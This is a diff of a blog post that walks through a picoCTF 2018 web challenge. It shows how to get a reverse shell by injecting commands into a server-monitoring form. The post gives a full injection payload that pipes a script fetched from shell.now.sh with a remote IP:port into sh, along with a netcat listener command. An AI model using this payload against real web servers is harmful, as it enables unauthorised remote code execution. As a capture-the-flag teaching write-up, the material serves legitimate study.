@@ -2,7 +2,7 @@
 >One of my school mate developed an alive monitoring tool. Can you get a flag from http://2018shell.picoctf.com:8587?
 
 Note.
->The CTF server somehow blocked the outbound connection to non-standard ports. So on our own server, we need to listen on port 80, `nc -lvp 80`.
+>The CTF server somehow blocked the outbound connection to non-standard ports. So on our own server, we need to listen on port 80, `sudo nc -lvp 80`.
 
 The main purpose of this blog post is to demonstrate how to get a webshell from a web server.
 
@@ -47,8 +47,7 @@ A few points to note,
   
 Since the symbol `;` can be used in PHP to chain the commands, if the payload of the POST request is `1.1.1.1 ; command`, then we can actually trick PHP to execute the command on the web sever!
 
-Here, we will use the command to get a reverse shell from the web server, so the complete payload looks like,
-`1.1.1.1 ; curl https://shell.now.sh/52.18.79.59:5580 | sh`
+Here, we will use the command to get a reverse shell from the web server, so the complete payload looks like, `1.1.1.1 ; curl https://shell.now.sh/52.18.79.59:5580 | sh`
 
 `https://shell.now.sh` is a HTTP endpoint that accept an `IP:PORT` as a path parameter, that the web server will be connecting to.
 
